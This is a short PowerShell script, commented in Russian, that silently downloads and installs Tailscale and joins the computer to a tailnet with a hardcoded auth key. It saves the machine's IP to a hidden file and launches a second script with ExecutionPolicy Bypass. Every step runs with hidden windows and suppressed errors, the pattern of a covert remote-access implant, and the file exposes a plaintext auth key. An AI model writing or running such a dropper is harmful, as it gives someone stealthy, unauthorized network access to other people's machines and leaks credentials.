# === НАСТРОЙКИ ===
$tailscaleUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.66.4.exe"
$authKey = "tskey-auth-kXszRT8qnP11CNTRL-PJZNB6pAKVj1gXdd3HzQVjhDML2XSFxRK"  # ← Вставьте свой ключ

# === ПУТИ ===
$installerPath = "$env:TEMP\tailscale-installer.exe"
$ipFile = "$env:USERPROFILE\Documents\.tailscale_ip.txt"

# === СКАЧАТЬ И УСТАНОВИТЬ ===
Invoke-WebRequest -Uri $tailscaleUrl -OutFile $installerPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath $installerPath -ArgumentList "/quiet" -WindowStyle Hidden -Wait

# === ПОДКЛЮЧЕНИЕ К TAILSCALE ===
Start-Process "tailscale" -ArgumentList "up --authkey $authKey --accept-routes" -WindowStyle Hidden -Wait

# === ВЗЯТЬ IP И СОХРАНИТЬ ===
Start-Sleep -Seconds 5
$tailscaleIP = (tailscale ip -4)[0]
$tailscaleIP | Out-File -FilePath $ipFile -Encoding UTF8

# === Готово ===
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "$env:USERPROFILE\Documents\test.ps1"
